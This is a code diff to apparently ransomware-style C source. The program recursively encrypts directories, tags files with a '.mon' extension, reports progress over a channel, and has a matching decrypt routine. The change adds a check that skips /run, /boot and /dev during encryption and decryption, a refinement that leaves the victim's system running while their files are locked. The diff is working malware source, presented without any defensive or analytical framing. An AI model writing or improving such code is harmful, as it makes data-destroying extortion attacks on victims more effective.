@@ -33,6 +33,18 @@
 
 char *extension = ".mon";
 
+static int is_restricted(char *path)
+{
+    char *restricted[] = {"/run", "/boot", "/dev"};
+
+    for (int i = 0; i < sizeof(restricted) / sizeof(restricted[0]); i++) {
+        if (strcmp(path, restricted[i]) == 0)
+            return 1;
+    }
+
+    return 0;
+}
+
 static int recursive_encrypt(char *path, char *key, char *iv)
 {
     DIR *fd = opendir(path);
@@ -142,13 +154,16 @@ int begin_encrypt(int channel, char *path, char *key, char *iv)
             else
                 target = link_string(path, dir->d_name, 1);
 
-            name = link_string("Encrypting ", target, 0);
-            name = link_string(name, "...\n", 0);
+            if (!is_restricted(target)) {
+                name = link_string("Encrypting ", target, 0);
+                name = link_string(name, "...\n", 0);
 
-            send_channel(channel, name);
-            recursive_encrypt(target, key, iv);
+                send_channel(channel, name);
+                recursive_encrypt(target, key, iv);
 
-            free(name);
+                free(name);
+            }
+
             free(target);
         }
     }
@@ -176,13 +191,16 @@ int begin_decrypt(int channel, char *path, char *key, char *iv)
             else
                 target = link_string(path, dir->d_name, 1);
 
-            name = link_string("Decrypting ", target, 0);
-            name = link_string(name, "...\n", 0);
+            if (!is_restricted(target)) {
+                name = link_string("Decrypting ", target, 0);
+                name = link_string(name, "...\n", 0);
 
-            send_channel(channel, name);
-            recursive_decrypt(target, key, iv);
+                send_channel(channel, name);
+                recursive_decrypt(target, key, iv);
 
-            free(name);
+                free(name);
+            }
+
             free(target);
         }
     }
